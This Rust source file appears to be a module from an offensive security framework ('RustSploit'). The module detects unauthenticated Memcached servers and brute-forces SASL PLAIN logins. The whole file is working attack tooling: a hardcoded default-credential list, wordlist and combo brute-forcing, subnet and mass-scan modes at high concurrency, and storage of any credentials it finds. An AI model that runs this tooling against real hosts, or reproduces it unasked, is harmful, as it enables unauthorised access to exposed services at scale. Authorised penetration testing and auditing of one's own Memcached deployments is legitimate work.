use anyhow::{anyhow, Result};
use colored::*;
use std::{io::Write, net::IpAddr, time::Duration};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    time::timeout,
};

use crate::modules::creds::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file, cfg_prompt_port,
    cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

// Constants
const DEFAULT_MEMCACHED_PORT: u16 = 11211;
const CONNECT_TIMEOUT_MS: u64 = 5000;
const READ_TIMEOUT_MS: u64 = 3000;

// Memcached binary protocol constants
const BINARY_MAGIC_REQUEST: u8 = 0x80;
const BINARY_MAGIC_RESPONSE: u8 = 0x81;
const OPCODE_SASL_AUTH: u8 = 0x21;
const SASL_STATUS_SUCCESS: u16 = 0x0000;
const SASL_STATUS_AUTH_ERROR: u16 = 0x0020;

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("memcached", "memcached"),
    ("admin", "password"),
    ("root", "root"),
    ("admin", ""),
    ("memcache", "memcache"),
    ("admin", "123456"),
    ("root", "password"),
];

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Memcached Brute Force".to_string(),
        description: "Detect open Memcached instances and brute-force SASL authentication. \
            First checks for unauthenticated access (text protocol version/stats commands), \
            then attempts SASL PLAIN auth over the binary protocol. Supports default credential \
            testing, combo mode, concurrent connections, and subnet/mass scanning."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

fn display_banner() {
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Memcached Brute Force Module                            ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Open Instance Detection + SASL Auth Testing (11211)     ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} — Mass Scan Mode", target).yellow()
        );
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "Memcached",
                default_port: 11211,
                state_file: "memcached_hose_state.log",
                default_output: "memcached_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| async move {
                let addr = format!("{}:{}", ip, port);
                let connect_timeout = Duration::from_secs(5);
                let read_timeout = Duration::from_secs(3);

                // Try to connect and send version command
                let mut stream = match crate::utils::network::tcp_connect(&addr, connect_timeout).await {
                    Ok(s) => s,
                    _ => return None,
                };

                // Send text protocol version command
                if timeout(connect_timeout, stream.write_all(b"version\r\n"))
                    .await
                    .is_err()
                {
                    return None;
                }

                let mut buf = vec![0u8; 1024];
                let n = match timeout(read_timeout, stream.read(&mut buf)).await {
                    Ok(Ok(n)) if n > 0 => n,
                    _ => return None,
                };

                let response = String::from_utf8_lossy(&buf[..n]);

                if response.contains("VERSION") {
                    // Open Memcached instance (no auth)
                    let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                    {
                        let id = crate::cred_store::store_credential(
                            &ip.to_string(),
                            port,
                            "memcached",
                            "(open)",
                            "(no auth)",
                            crate::cred_store::CredType::Password,
                            "creds/generic/memcached_bruteforce",
                        )
                        .await;
                        if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                    }
                    return Some(format!(
                        "[{}] {}:{} Memcached OPEN (no auth) - {}\n",
                        ts,
                        ip,
                        port,
                        response.trim()
                    ));
                }

                if response.contains("ERROR") {
                    // Might need SASL auth — try default creds via binary protocol
                    let creds = [
                        ("admin", "admin"),
                        ("memcached", "memcached"),
                        ("admin", "password"),
                        ("root", "root"),
                    ];
                    for (user, pass) in creds {
                        // Need a fresh connection for each SASL attempt
                        if let Ok(result) =
                            try_memcached_sasl(&addr, user, pass, connect_timeout, read_timeout)
                                .await
                        {
                            if result {
                                let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                                {
                                    let id = crate::cred_store::store_credential(
                                        &ip.to_string(),
                                        port,
                                        "memcached",
                                        user,
                                        pass,
                                        crate::cred_store::CredType::Password,
                                        "creds/generic/memcached_bruteforce",
                                    )
                                    .await;
                                    if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                                }
                                return Some(format!(
                                    "[{}] {}:{}:{}:{}\n",
                                    ts, ip, port, user, pass
                                ));
                            }
                        }
                    }
                }

                None
            },
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        let port: u16 =
            cfg_prompt_port("port", "Memcached Port", DEFAULT_MEMCACHED_PORT).await?;

        let usernames_file =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() {
            return Err(anyhow!("Username wordlist is empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Password wordlist is empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "memcached_subnet_results.txt",
        )
        .await?;

        let timeout_secs: u64 = {
            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
            input.parse::<u64>().unwrap_or(5).max(1).min(60)
        };
        let connect_timeout = Duration::from_millis(timeout_secs * 1000);
        let read_timeout = Duration::from_millis(READ_TIMEOUT_MS);

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "memcached",
                jitter_ms: 0,
                source_module: "creds/generic/memcached_bruteforce",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let ct = connect_timeout;
                let rt = read_timeout;
                async move {
                    let addr = format!("{}:{}", ip, port);
                    match try_memcached_sasl(&addr, &user, &pass, ct, rt).await {
                        Ok(true) => LoginResult::Success,
                        Ok(false) => LoginResult::AuthFailed,
                        Err(e) => LoginResult::Error {
                            message: e.to_string(),
                            retryable: true,
                        },
                    }
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "Memcached Port", DEFAULT_MEMCACHED_PORT).await?;

    let normalized = normalize_target(target)?;
    let connect_addr = format!("{}:{}", normalized, port);

    // First, check if the instance is open (unauthenticated)
    crate::mprintln!(
        "\n{}",
        format!("[*] Checking {} for unauthenticated access...", connect_addr).cyan()
    );

    let connect_timeout = Duration::from_millis(CONNECT_TIMEOUT_MS);
    let read_timeout = Duration::from_millis(READ_TIMEOUT_MS);

    match check_memcached_open(&connect_addr, connect_timeout, read_timeout).await {
        MemcachedStatus::Open(version) => {
            crate::mprintln!(
                "{}",
                format!(
                    "[+] Memcached at {} is OPEN (no authentication required)!",
                    connect_addr
                )
                .green()
                .bold()
            );
            crate::mprintln!("{}", format!("[+] Version: {}", version).green());
            crate::mprintln!(
                "{}",
                "[!] WARNING: This Memcached instance is publicly accessible without auth."
                    .red()
                    .bold()
            );

            {
                let id = crate::cred_store::store_credential(
                    &normalized,
                    port,
                    "memcached",
                    "(open)",
                    "(no auth)",
                    crate::cred_store::CredType::Password,
                    "creds/generic/memcached_bruteforce",
                )
                .await;
                if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
            }

            let continue_brute =
                cfg_prompt_yes_no("continue_bruteforce", "Continue with SASL brute-force anyway?", false).await?;
            if !continue_brute {
                return Ok(());
            }
        }
        MemcachedStatus::AuthRequired => {
            crate::mprintln!(
                "{}",
                "[*] Memcached requires SASL authentication. Proceeding with brute-force.".cyan()
            );
        }
        MemcachedStatus::Unreachable(err) => {
            crate::mprintln!(
                "{}",
                format!("[!] Cannot connect to {}: {}", connect_addr, err).red()
            );
            let continue_anyway =
                cfg_prompt_yes_no("continue_anyway", "Continue anyway?", false).await?;
            if !continue_anyway {
                return Ok(());
            }
        }
    }

    // Ask about default credentials
    let use_defaults =
        cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file =
        if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
            Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
        } else {
            None
        };

    let passwords_file =
        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
        } else {
            None
        };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!(
            "At least one wordlist or default credentials must be enabled"
        ));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
        input.parse::<u64>().unwrap_or(5).max(1).min(60)
    };

    let retry_on_error =
        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file("output_file", "Output file", "memcached_brute_results.txt")
                .await?,
        )
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} usernames", usernames.len()).green()
            );
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} passwords", passwords.len()).green()
            );
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!(
            "{}",
            format!(
                "[*] Added {} default credentials",
                DEFAULT_CREDENTIALS.len()
            )
            .green()
        );
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }
    let ct = Duration::from_secs(connection_timeout);
    let rt = Duration::from_millis(READ_TIMEOUT_MS);

    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let connect_t = ct;
        let read_t = rt;
        async move {
            let addr = normalize_target(&format!("{}:{}", t, p))
                .unwrap_or_else(|_| format!("{}:{}", t, p));
            match try_memcached_sasl(&addr, &user, &pass, connect_t, read_t).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => LoginResult::Error {
                    message: e.to_string(),
                    retryable: true,
                },
            }
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: normalized,
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries,
            service_name: "memcached",
            jitter_ms: 0,
            source_module: "creds/generic/memcached_bruteforce",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored Memcached responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "memcached_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# Memcached Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

// ============================================================================
// Memcached protocol helpers
// ============================================================================

enum MemcachedStatus {
    /// Instance is open (no auth), includes the version string.
    Open(String),
    /// Instance requires SASL authentication.
    AuthRequired,
    /// Cannot reach the instance.
    Unreachable(String),
}

/// Check if a Memcached instance is open (no auth) or requires SASL.
async fn check_memcached_open(
    addr: &str,
    connect_timeout: Duration,
    read_timeout: Duration,
) -> MemcachedStatus {
    let mut stream = match crate::utils::network::tcp_connect(addr, connect_timeout).await {
        Ok(s) => s,
        Err(e) => return MemcachedStatus::Unreachable(e.to_string()),
    };

    // Send text protocol "version" command
    if let Err(e) = timeout(connect_timeout, stream.write_all(b"version\r\n")).await {
        return MemcachedStatus::Unreachable(format!("Write error: {}", e));
    }

    let mut buf = vec![0u8; 1024];
    let n = match timeout(read_timeout, stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => n,
        Ok(Ok(_)) => return MemcachedStatus::Unreachable("Empty response".to_string()),
        Ok(Err(e)) => return MemcachedStatus::Unreachable(format!("Read error: {}", e)),
        Err(_) => return MemcachedStatus::Unreachable("Read timeout".to_string()),
    };

    let response = String::from_utf8_lossy(&buf[..n]);

    if response.contains("VERSION") {
        MemcachedStatus::Open(response.trim().to_string())
    } else if response.contains("ERROR") {
        MemcachedStatus::AuthRequired
    } else {
        MemcachedStatus::Unreachable(format!("Unknown response: {}", response.trim()))
    }
}

/// Build a Memcached binary protocol SASL Auth request packet.
///
/// Binary protocol header (24 bytes):
///   magic:              0x80 (request)
///   opcode:             0x21 (SASL Auth)
///   key_length:         length of "PLAIN"
///   extras_length:      0
///   data_type:          0
///   vbucket/status:     0
///   total_body_length:  key_len + value_len
///   opaque:             0
///   cas:                0
///   key:                "PLAIN"
///   value:              "\0username\0password"
fn build_sasl_auth_packet(username: &str, password: &str) -> Vec<u8> {
    let mechanism = b"PLAIN";
    let key_len = mechanism.len() as u16;

    // SASL PLAIN payload: \0username\0password
    let mut sasl_payload = Vec::new();
    sasl_payload.push(0x00);
    sasl_payload.extend_from_slice(username.as_bytes());
    sasl_payload.push(0x00);
    sasl_payload.extend_from_slice(password.as_bytes());

    let value_len = sasl_payload.len();
    let total_body_len = (key_len as u32) + (value_len as u32);

    let mut packet = Vec::with_capacity(24 + total_body_len as usize);

    // Header (24 bytes)
    packet.push(BINARY_MAGIC_REQUEST); // magic
    packet.push(OPCODE_SASL_AUTH); // opcode
    packet.extend_from_slice(&key_len.to_be_bytes()); // key length
    packet.push(0x00); // extras length
    packet.push(0x00); // data type
    packet.extend_from_slice(&0u16.to_be_bytes()); // vbucket/status
    packet.extend_from_slice(&total_body_len.to_be_bytes()); // total body length
    packet.extend_from_slice(&0u32.to_be_bytes()); // opaque
    packet.extend_from_slice(&0u64.to_be_bytes()); // CAS

    // Body
    packet.extend_from_slice(mechanism); // key: "PLAIN"
    packet.extend_from_slice(&sasl_payload); // value: \0user\0pass

    packet
}

/// Parse the status code from a Memcached binary protocol response.
/// The status is at bytes 6-7 (big-endian u16) of the 24-byte header.
fn parse_binary_response_status(response: &[u8]) -> Option<u16> {
    if response.len() < 24 {
        return None;
    }
    if response[0] != BINARY_MAGIC_RESPONSE {
        return None;
    }
    Some(u16::from_be_bytes([response[6], response[7]]))
}

/// Attempt Memcached SASL PLAIN authentication over the binary protocol.
///
/// Opens a fresh TCP connection, sends a SASL Auth request with the PLAIN
/// mechanism, and parses the binary response status.
///
/// Returns:
/// - `Ok(true)` — SASL authentication succeeded (status 0x0000)
/// - `Ok(false)` — authentication rejected (status 0x0020)
/// - `Err(_)` — connection/timeout/protocol error
async fn try_memcached_sasl(
    addr: &str,
    username: &str,
    password: &str,
    connect_timeout: Duration,
    read_timeout: Duration,
) -> Result<bool> {
    let mut stream = match crate::utils::network::tcp_connect(addr, connect_timeout).await {
        Ok(s) => s,
        Err(e) => {
            let err_str = e.to_string();
            if err_str.contains("Connection refused") || err_str.contains("connect") {
                return Err(anyhow!("Connection refused: {}", err_str));
            }
            return Err(anyhow!("Connection error: {}", err_str));
        }
    };

    let packet = build_sasl_auth_packet(username, password);

    // Send the SASL auth packet
    match timeout(connect_timeout, stream.write_all(&packet)).await {
        Ok(Ok(())) => {}
        Ok(Err(e)) => return Err(anyhow!("Write error: {}", e)),
        Err(_) => return Err(anyhow!("Write timeout")),
    }

    // Read the response (at least 24-byte header)
    let mut buf = vec![0u8; 256];
    let n = match timeout(read_timeout, stream.read(&mut buf)).await {
        Ok(Ok(n)) if n >= 24 => n,
        Ok(Ok(n)) if n > 0 => {
            return Err(anyhow!(
                "Incomplete binary response ({} bytes, need >= 24)",
                n
            ));
        }
        Ok(Ok(_)) => return Err(anyhow!("Empty response from server")),
        Ok(Err(e)) => return Err(anyhow!("Read error: {}", e)),
        Err(_) => return Err(anyhow!("Read timeout")),
    };

    match parse_binary_response_status(&buf[..n]) {
        Some(SASL_STATUS_SUCCESS) => Ok(true),
        Some(SASL_STATUS_AUTH_ERROR) => Ok(false),
        Some(status) => Err(anyhow!("Unexpected SASL response status: 0x{:04x}", status)),
        None => Err(anyhow!("Invalid binary protocol response")),
    }
}
